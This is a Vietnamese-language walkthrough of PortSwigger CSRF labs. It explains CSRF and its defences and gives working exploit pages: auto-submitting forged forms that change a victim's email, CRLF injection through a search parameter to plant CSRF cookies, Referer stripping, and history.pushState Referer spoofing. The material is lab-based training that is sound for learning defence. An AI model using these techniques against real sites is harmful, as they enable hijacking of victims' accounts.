
* [Portswigger - Cross-site request fogery](#pcsrf)
  - [1. CSRF vulnerability with no defenses](#pcsrf1)
  - [2. CSRF where token validation depends on request method](#pcsrf2)
  - [3. CSRF where token validation depends on token being present](#pcsrf3)
  - [4. CSRF where token is not tied to user session](#pcsrf4)
  - [5. CSRF where token is tied to non-session cookie](#pcsrf5)
  - [6. CSRF where token is duplicated in cookie](#pcsrf6)
  - [7. SameSite Lax bypass via method override](#pcsrf7)
  - [8. SameSite Strict bypass via client-side redirect](#pcsrf8)
  - [9. SameSite Strict bypass via sibling domain](#pcsrf9)
  - [10. SameSite Lax bypass via cookie refresh](#pcsrf10)
  - [11. CSRF where Referer validation depends on header being present](#pcsrf11)
  - [12. CSRF with broken Referer validation]()

## What is Csrf?
- csrf hay cross-site request fogery là một lỗ hổng bảo mật web cho phép kẻ tấn công khiến người dùng thực hiện các hành động mà họ không có ý định thực hiện. Nó cũng như xss cho phép kẻ tấn công phá vỡ sop (same origin policy), được thiết kế để ngăn chặn các trang web khác nhau can thiệp lẫn nhau. 
Khi thực hiện một cuộc tấn công csrf kẻ tấn công sẽ tạo ra một trang web giả mạo, trong đó chứa các yêu cầu http được thiết kế để khai thác lỗ hổng của trình duyệt web người dùng. Khi người dùng truy cập vào trang web giả mạo, các yêu cầu http sẽ được tự động thực hiện đến 1 trang web khác mà người dùng đã đăng nhập trước đó. Do đó kẻ tấn công có thể lừa được hệ thống để thực hiện các hành động không mong muốn mà không cần biết được tên người dùng và mật khẩu của họ.

Một ví dụ về tấn công csrf có thể là khi kẻ tấn công tạo một trang web giả mạo đăng nhập vào trang web của ngân hàng. Khi người dùng truy cập vào trang web giải mạo và thực hiện các hành động trên trang đó, các yêu cầu http sẽ được gửi đến trang web ngân hàng mà không được biết đến. Kẻ tấn công có thể sử dụng các yêu cầu này để thực hiện các hành động không mong muốn chẳng hạn như chuyển tiền hoặc thay đổi thông tin tài khoản của người dùng. (các yêu cầu HTTP được tự động gửi đến trang web ngân hàng mà không cần sự cho phép hay sự thực thi của người dùng. Điều này là do trình duyệt web của người dùng đã lưu trữ các cookie đăng nhập của trang web ngân hàng, và các cookie này được gửi đến trang web ngân hàng khi các yêu cầu HTTP được thực hiện).

Ở đây ta sẽ thấy cách thức của csrf có phần giống với xss. Tuy nhiên thì chúng có sự khác nhau về cách thức tấn công và mục đích tấn công.

- XSS: Tấn công xss thường nhắm vào việc chèn mã độc js hoặc html vào các trang web mà người dùng có thể truy cập, để lừa đảo hoặc đánh cắp thông tin người dùng. Điều này xảy ra khi trang web không xác thực trang đầu vào của trang web mà người dùng có thể truy cập, hoặc không mã hóa đầu vào đúng cách.
- CSRF: tấn công csrf thường nhắm vào việc khai thác việc người dùng đã đăng nhập vào một trang web nào đó. Khi kẻ tấn công tạo ra các yêu cầu http giả mạo trên trang web giả mạo của họ, các yêu cầu sẽ được gửi đến trang web mà người dùng đã đăng nhập trước đó, để thực hiện được hành động mà người dùng không mong muốn trên trang. Điều này có thể xảy ra khi các trang web khong yêu cầu xác thực nguồn gốc của http hoặc khong sử dụng các biện pháp bảo mật để ngăn chặn tấn công csrf. Tấn công xss có thể được phòng ngừa bằng cách kiểm tra và xử lí đầu vào của người dùng trước khi hiển thị lên trang web.

Tóm lại sự khác nhau cơ bản nhất giữa xss và csrf là mục đích tấn công. Tấn công xss nhằm vào việc đánh cắp thông tin người dùng hoặc thực hiện các hành động dodjc hại trên trang web, trong khi đó thì tấn công csrf nhắm vào việc khai thác sự đăng nhập của người dùng để thực hiện các hành động không mong muốn trên trang web mà người dùng đã đăng nhập tước đó. Tấn công csrf có thể được phòng ngừa bằng cách sử dụng các biện pháp bảo vệ như mã thông báo csrf và cơ thế xác thực kép (double-submit cookies), kiểm tra tham chiếu (referer header) trong yêu cầu http, và giám sát các hoạt động đáng ngờ trên trang web của họ. 

Hậu quả của xss thường là nghiêm trọng hơn so với lỗ hổng csrf: 
- csrf thường chỉ áp dụng cho một số hành động mà người dùng có thể thực hiện, nhiều ứng dụng triển khai hệ thống phòng thủ csrf nói chung nhưng bỏ sót một hoặc hai hành động bị lộ ra. Ngược lại một cuộc tấn công xss mà thành công thì thường có thể giúp kẻ tấn công thực hiện bất kỳ hành động nào mà người dùng có thể thực hiện.
- Csrf có thể được mô tả là lỗ hổng 1 chiều, trong đó kẻ tấn công có thể thuyết phục nạn nhân thực hiện một số http, nhưng không thể lấy lại phản hồi từ yêu cầu đó ( tức là ta có thể hiểu ở đây là khi mà kẻ tấn công gửi yêu cầu thực hiện cho nạn nhân ). Ngược lại, xss là 'hai chiều', bởi vì mã độc được chèn của kẻ tấn công có thể đưa ra các yêu cầu tùy ý, đọc các phản hồi và đánh cắp dữ liệu đến một trang khác do kẻ tấn công chọn.


## Phòng thủ chống lại csrf: 

Ngày nay việc tìm kiếm và khai thác thành công các lỗ hổng csrf thường liên quan đến việc bỏ qua các biện pháp chống csrf được triển khai bởi trang web mục tiêu, trình duyệt của nạn nhân hoặc cả hai. Các biện pháp bảo vệ phổ biến nhất mà ta sẽ gặp phải như:
- Csrf token - csrf token là một giá trị duy nhất, bí mật và không thể đoán trước được tạo ra bởi ứng dụng phía server và được chia sẻ với client. Khi cố gắng thực hiện các hành động nhạy cảm, chẳng hạn như gửi biểu mẫu, client phải bao gồm mã csrf token chính xác trong yêu cầu. Điều này giúp cho việc tấn công bên hacker trở nên khó khăn trong việc tạo ra 1 request hợp lệ.

- SameSite cookies: Samesite là một cơ chế bảo mật của trình duyệt xác định khi nào cookie của 1 trang web được bao gồm trong các request bắt nguồn từ các trang web khác. Vì yêu cầu thực hiện các hành động nhạy cảm thường yêu cầu cookie session được xác thực, các hạn chế SameSite thích hợp để ngăn chặn kẻ tấn công kích hoạt các hành động này trên trang web.

Có 2 loại samesite là lax và strict:
+ Strict: đây là tùy chọn trong đó same-site được áp dụng nghiêm ngặt. Khi các thuộc tính samesite được đặt là strict, cookie sẽ không được gửi cùng các request được bắt đầu bởi các trang web của bên thứ 3. Đặt cookie là strict có thể ảnh hưởng tiêu cự đến trải nghiệm trình duyệt web. Ví dụ nếu ta nhấp vào một liên kết đến trang profile của Facebook và Facebook.com đặt cookie của nó là samesite=strict thì ta sẽ kh thể tiếp tục redirect trên facebook trừ khi ta đăng nhập vào facebook. Lý do là vì cookie của facebook không được gửi kèm với request này.

+ Lax: khi ta đặt thuộc tính samesite của cookie thành lax, cookie sẽ được gửi cùng với get request được tạo bởi bên thứ 3, ngoài ra còn có các phương thức request an toàn khác như head, options, trace. Còn phương thức như POST thường là kiểu http 'không an toàn' nên cookie không được thực thi khi samesite=lax.

Xác thực dựa trên referer: một số ứng dụng sử dụng tiêu đề referer http để cố gắng chống lại các cuộc tấn công csrf, thông thường bằng cách xác minh rằng yêu cầu bắt nguồn từ miền riêng cửa ứng dụng. Điều này thường kém hiệu quả hơn csrf token nêu ở trên.

Ta sẽ đi sâu vấn đề hơn và làm bài lab của từng phần:


## Bypassing CSRF token validation

Trước hết để có thể thực hiện được 1 cuộc tấn công csrf, ta cần có các điều kiện sau:
+ relevant action: phải có 1 hành động liên quan, cụ thể trong các bài lab này là việc thay đổi email người dùng ( ví dụ chẳng hạn ta có thể thực hiện được việc thay đội email của người dùng, thì nó có thể gây ra tác động đáng kể đối với khác hàng hoặc người dùng nạn nhân, cụ thể thì khi có email thì ta có thể sử dụng chức năng quên mật khẩu để đặt lại tài khoản người dùng và khi đó thì email nhận được thông báo sẽ là của ta thay vì của nạn nhân, tất nhiên thì đây là bài lab nên ví dụ của nó là ảnh hưởng rất nhỏ vậy, còn trên thực tế thì nó có thể dùng nhiều mục đích khác hơn tùy vào chức năng của trang nữa)

+ Thứ 2 là cookie-based session handling: ứng dụng sẽ sử dụng session cookie để thực hiện xử lí phiên.
+ No unpredictable request parameters: ở đây ta sẽ có chủ yếu 2 tham số để tấn công là csrf và email, với tham số email thì ta biết được vì là tham số để ta tấn công, còn csrf là mã ngẫu nhiên kh đoán trước được, nhưng ta có thể dựa vào cách web triển khai để khai thác nó cho hợp lí.

### [1. CSRF where token validation depends on request method](https://portswigger.net/web-security/csrf/bypassing-token-validation/lab-token-validation-depends-on-request-method)

Bài lab này mô phỏng việc website xác thực csrf token phục thuộc vào phương thức yêu cầu: 
Đầu tiên ta vào phần đăng nhập với mục đích bắt request của thay đổi email:

![image](https://user-images.githubusercontent.com/104350480/224540812-bd860831-cc62-4f9c-a601-396ab6872366.png)

Ở phương thức POST có csrf token đi kèm:

![image](https://user-images.githubusercontent.com/104350480/224540814-63ecccda-fe77-4ff2-877a-8a1f2dc0c11e.png)

Bỏ đi thì sẽ báo lỗi là rõ:

![image](https://user-images.githubusercontent.com/104350480/224540815-5ce6caf3-f646-4952-8451-7710a96485be.png)

Mà bài này thì chuyển về phương thức GET lại không: 

![image](https://user-images.githubusercontent.com/104350480/224540823-03d251b0-c4b5-4c5e-ac72-d13dbb1f39bd.png)

Viết form đơn giản gửi qua phần exploit: 

![image](https://user-images.githubusercontent.com/104350480/224540834-1e3e83b1-b324-42a2-b82e-2310600e2213.png)

```
<form id='csrf' action='https://0ac90074044080ffc16121c5000c0026.web-security-academy.net/my-account/change-email' method='GET'>
<input type='hidden' name='email' value='manhhuy08112002@gmailcom'>
<input type='submit'>
</form>
<script>
document.getElementById('csrf').submit();

</script>

```

### [2. CSRF where token validation depends on token being present](https://portswigger.net/web-security/csrf/bypassing-token-validation/lab-token-validation-depends-on-token-being-present)

- Một số ứng dụng xác thực csrf token khi nó xuất hiện nhưng bỏ qua xác thực nếu mã thông báo bị bỏ qua, ta vẫn dùng cái trên được luôn, vì đăng nào bỏ csrf cũng được: 

```
<form id='csrf' action='https://0ab500c2030dc84fc0f0598d000200a1.web-security-academy.net/my-account/change-email' method='POST'>
<input type='hidden' name='email' value='manhhuy2002@gmail.com'>
<input type='submit'>
</form>
<script>
document.getElementById('csrf').submit();
</script> 

```
### [3. CSRF where token is not tied to user session](https://portswigger.net/web-security/csrf/bypassing-token-validation/lab-token-not-tied-to-user-session)

Tình huống của bài lab này là ứng dụng web nó không hề xác thực xem csrf trong request có thuộc về 1 session của 1 user liên quan hay không. Việc này có thể hình dung là bên server tạo 1 kho chứa các token được sinh ra, miễn là token được lấy từ trong này ra thì server sẽ coi nó là hợp lệ. Với bài lab này ta sẽ chỉ cần lấy thêm cái csrf token được cấp phát sẵn.

Vấn đề là mỗi csrf token chỉ được sử dụng một lần duy nhất trong mỗi yêu cầu, nên là ta sẽ cần sử dụng 1 csrf token được sinh ra mà chưa thực hiện yêu cầu ở đây, nên ta sẽ login 1 user khác, và lấy csrf token được cấp cho phần thực hiện request ở đây là change-email: 

Ở đây ta login vào tài khoản của carlos và lấy csrf token được cấp: efsmiBoiBBxu4ue3ZnOXYNmHN9UIdBVl

![image](https://user-images.githubusercontent.com/104350480/225234294-91e9748a-79ae-4b90-8238-46370d340ec0.png)

Giờ ta chỉ cần thực hiện tấn công csrf qua exploit server như các phần trên là được: 

```
<form id='csrf' action='https://0a69004b0378802cc04d15920022001e.web-security-academy.net/my-account/change-email' method='POST'>
<input type='hidden' name='email' value='manhhuy2002@gmail.com'>
<input type='hidden' name='csrf' value='efsmiBoiBBxu4ue3ZnOXYNmHN9UIdBVl'>
<input type='submit'>
</form>
<script>
document.getElementById('csrf').submit();
</script> 
```

### [4. CSRF where token is tied to non-session cookie](https://portswigger.net/web-security/csrf/bypassing-token-validation/lab-token-tied-to-non-session-cookie)

Bài lab này thì nó khác ở bài lab trước ở chỗ nó có gắn thêm csrf token vào cả phần session: cookie, nhưng mà cookie ở đây không phục vụ cho việc theo dỗi user session. Điều cần lưu ý ở đây là attackere sẽ cần có 1 phương án để cài cái non-session cookie vào browser của nạn nhân, từ đó có 1 vụ tấn công thành công được.

vào phần account, change-email và ta bắt burp-suite xem: 

![image](https://user-images.githubusercontent.com/104350480/225237551-8e08dfed-ad5c-4ba6-b5e5-878d67aa0634.png)

Có thêm đối tượng mới xuất hiện là csrfKey cookie, bên cạnh cái csrf token như các bài lab trước. 
Ở đây thay đổi tự do cái csrf token hay csrfKey cookie thì cũng sẽ không thu được gì và chỉ trả về invalid csrf token. Nhưng có điều đáng chú ý là nó khi thay đổi csrfKey thì nó không có báo lỗi ảnh hưởng gì đến cookie session, nên có thể thấy là csrfKey đang bị buộc nhầm chỗ. Nhưng mà có thể thấy là cái csrf và csrfKey có liên kết với nhau.

Ta mở thêm tài khoản của carlos và tráo đổi 2 thành phần của 2 bên cho nhau thì thấy vẫn có thể thay đổi được email bình thường như bài lab trên. 
Và cái csrfKey này là cố định chỉ có csrf token bị thay đổi. Do đó để tấn công được ta cần phải tiêm được cookie http có tên là csrfKey và chèn cookie của riêng chúng ta vào, và thực hiện tương tự như các bài lab trên. Hay cụ thể hơn bước quan trọng ở đây là thực hiện được http header theo ý mình muốn là csrfKey = với giá trị ta được cấp, thì ở đây ý tưởng là ta sẽ tiêm http header thông qua th search và sau đó server sẽ lấy giá trị của CSRF token từ HTTP header và sử dụng giá trị đó để xác thực request. 
Ở đây ta nhúng img vào với %0d%0a để tiêm vào http header và onerror để load form vì src ta cấp cho img lỗi là chắc với kí tự kia rồi. Cái chỗ csrfKey thì thực ra mình cũng chưa hiểu lắm, mình đang hiểu là ở đây tiêm 1 http header vào hay chèn cookie csrfKey vào và dựa vào phản hồi http header từ máy chủ rồi trình duyệt sẽ xử lý đó như là một phần của phản hồi và lưu trữ nó vào cookie trên máy tính của người dùng điều này sẽ được lưu trữ trên trình duyệt của nạn nhân khi họ truy cập trang web.

Cụ thể đầu tiên ta sẽ làm như sau: 

![image](https://user-images.githubusercontent.com/104350480/225388346-1bc3adaf-c9c6-447d-891d-c4cee226f3a3.png)

Bên server đã chấp nhận, sau đó ta sẽ thực hiện tương tự như các bài lab trước, như đã nói ở trên ta cần nhúng csrfKey vào nên ta sẽ thực hiện bằng cách dùng img: 

```
      <form method="POST" action="https://0a710093043d2ec2c415d20700be0075.web-security-academy.net/my-account/change-email" >
        <input type="hidden" name="email" value="1manhhuy2002@gmail.com" />
        <input type="hidden" name="csrf" value="Xs7dJWL7tw1a1xPD1Hkw1cMXlZJ3BNGS" />
        <input type="submit" value="Submit request" />
      </form>
  <img src="https://0a710093043d2ec2c415d20700be0075.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrfKey=oOuXqmhVhMGrJCSP7oTLu7ypF8roXQzh%3b%20SameSite=None" onerror="document.forms[0].submit()">

```

## [5. CSRF where token is duplicated in cookie](https://portswigger.net/web-security/csrf/bypassing-token-validation/lab-token-duplicated-in-cookie)

Bài này là 1 ví dụ đơn giản hơn chall trước nhưng ý tưởng vẫn thế, ta chỉ cần thay csrfKey ở bài trước thành csrf ở bài này, đặc biệt là giá trị csrf ở đây được tùy chỉnh miễn là 2 cái giống nhau là được nên ta có thể dùng script như bên dưới để thực hiện luôn: 

![image](https://user-images.githubusercontent.com/104350480/225396472-35577f21-547e-4e81-af60-d2552a4871a6.png)


```
<form method='POST' action='https://0a01002a041ea7e0c15ae5bf00e7008c.web-security-academy.net/my-account/change-email'>
<input type='hidden' name='email' value='manhhuy2002@gmail.com'>
<input type='hidden' name='csrf' value='test'>
<input type='submit'>
</form>
<img src="https://0a01002a041ea7e0c15ae5bf00e7008c.web-security-academy.net/?search=abcd%0d%0aSet-Cookie:%20csrf=test%3b%20SameSite=None"
 onerror="document.forms[0].submit()">
 
 ```

## [10. CSRF where Referer validation depends on header being present](https://portswigger.net/web-security/csrf/bypassing-referer-based-defenses/lab-referer-validation-depends-on-header-being-present)

Trong kịch bản ở 2 bài lab cuối 10 và 11 này, ngoài kiểu chống csrf attack với csrf token và bypass csrf samesite thì ứng dụng có thể sử dụng cả http referer header.

Với phương án này, ứng dụng sẽ xác nhận xem request có xuất phát từ domain tương ứng haykhoong nên nhìn chung sẽ kém hiểu quả hơn. Cụ thể ở bài lab này sẽ có kịch bản là quá trình xác minh tùy thuộc vào sự có mặt của referer header.

Vẫn như các bài lab trước ta đăng nhập và update email: 

![image](https://user-images.githubusercontent.com/104350480/225495034-dfc34657-f262-4225-ab9f-0f4057c97e6f.png)

Mở burpsuite phần post /change-email và chú ý phần referer, khi ta chinh sửa nó thì nó sẽ có vấn đề:

![image](https://user-images.githubusercontent.com/104350480/225495981-669bba27-7048-4940-bfb1-184f02d970d8.png)

Nhưng như tên bài, nó dựa vào việc có mặt của referer giống như bài lab dựa vào sự có mặt của csrf token, ta cắt xén nó đi thì vẫn oke: 

Nên ta có thể thực hiện exploit luôn: 

```
Với phần header: 
<meta ='referrer' content='no-referrer'>
Với phần body:
<form id='csrf' method='POST' action='https://0ac1007e04ca2608c0d70d04006b00c2.web-security-academy.net/my-account/change-email'>
<input type='hidden' name='email' value='manhhuy2002@gmail.com'
<input type='submit'>
</form> 
<script>document.getElementById('csrf').submit();</script>
```
## [11. SRF with broken Referer validation](https://portswigger.net/web-security/csrf/bypassing-referer-based-defenses/lab-referer-validation-broken)

Ở bài lab tiếp theo này thì đã được xử lí tình huống ở bài lab trước, khi cắt đi referer header thì sẽ bị báo lỗi:

![image](https://user-images.githubusercontent.com/104350480/225498371-9ef4843f-2127-4e76-9c56-ede6fd832b01.png)

Nhưng vấn đề ở đây là server sẽ chỉ kiểm tra sự có mặt của nó còn thêm mắm muối vào lại không sao cả:

![image](https://user-images.githubusercontent.com/104350480/225498574-364a6670-aae3-4033-acb5-6bbd63b75c7b.png)

Để giải quyết bài lab này ta có thể sử dụng hàm history.pushState() với các tham số history.pushState(state,title,url) , hàm này dược sử dụng để thêm trạng thái mới của trình duyệt mà không ảnh hưởng hay phải load lại nội dung hiện tại của trang web. Tham số thứ 3 ta sẽ lợi dụng ở đây là url để cập nhận url hiển thị trong thanh trình duyện mà không làm tải lại trang web. VIệc này cho phép ta đánh dấu trang web và chuyển hướng đến trang đó trong tương lai mà không mất bất kì dữ liệu nào hiện tại trên trang web. Mục đích sử dụng hàm history.pushState() để tạo một trạng thái mới trong lịch sử trình duyệt của nạn nhân. Khi nạn nhân click vào đường link, trình duyệt sẽ lưu trữ URL trên đó được truy cập từ trang web gốc của nạn nhân.

Vẫn vậy ta dùng đoạn code sau để exploit, ta truyền vào 1 url tương đối cũng được: 

```
<script> history.pushState("", "", "/?12342340ad7005e037de64ec3d444b600bd00b7.web-security-academy.net/my-account") </script>
<form id='csrf' method='POST' action='https://0ad7005e037de64ec3d444b600bd00b7.web-security-academy.net/my-account/change-email' >
<input type='hidden' name='email' value='manhhuy2002@gmail.com' >
<input type='submit' >
</form>
<script> document.getElementById('csrf').submit() </script>

```

Nhưng mà khi chạy như trên ta sẽ bị lỗi trả về: 

![image](https://user-images.githubusercontent.com/104350480/225505658-f5d366ac-6f3a-4d7b-93db-35bab7e180fc.png)

Có thể ở đây là do một số browser sẽ triển khai giải pháp bảo mật và tự động cắt cái query string ra khỏi referer header. Để đảm bảo không bị cắt xén thì ta có thể cập nhập thêm nội dung: Referer-Policy vào phần Head section của exploit để ghi đè như sau: 

![image](https://user-images.githubusercontent.com/104350480/225505981-463b307b-61f9-416d-a566-ef46856632e5.png)

Và bài lab được giải quyết :(

